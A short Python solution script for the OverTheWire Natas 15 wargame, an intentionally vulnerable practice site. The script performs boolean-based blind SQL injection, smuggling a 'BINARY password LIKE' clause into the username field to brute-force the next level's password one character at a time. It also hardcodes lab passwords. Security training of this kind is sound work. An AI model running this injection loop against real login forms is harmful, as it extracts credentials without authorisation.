#!/usr/local/bin/python3
import requests
import re
from string import *

characters = ascii_lowercase + ascii_uppercase + digits

username = "natas15"
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://%s.natas.labs.overthewire.org/?debug' % username

pas = '%'

while (6 < 7):
    for char in characters:
        data = {"username": 'natas16" AND BINARY password LIKE "%s' % pas.replace("%", char + "%")}
        response = requests.post(url, auth=(username, password), data=data)
        content = response.text
        condition = re.findall('<br>This user (.*).<br', content)[0]
        if condition == "exists":
            pas = pas.replace("%", char + "%")
            print('password starts with %s' % pas.replace("%", ""))
            break
    if len(pas) == len(password) + 1:
        break

print(pas.replace("%", ""))


# Comprobation!

# data = {"username": 'natas16" AND password ="WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'}
# response = requests.post(url, auth=(username, password), data=data)
# content = response.text
# condition = re.findall('<br>This user (.*).<br', content)[0]
# print(condition)
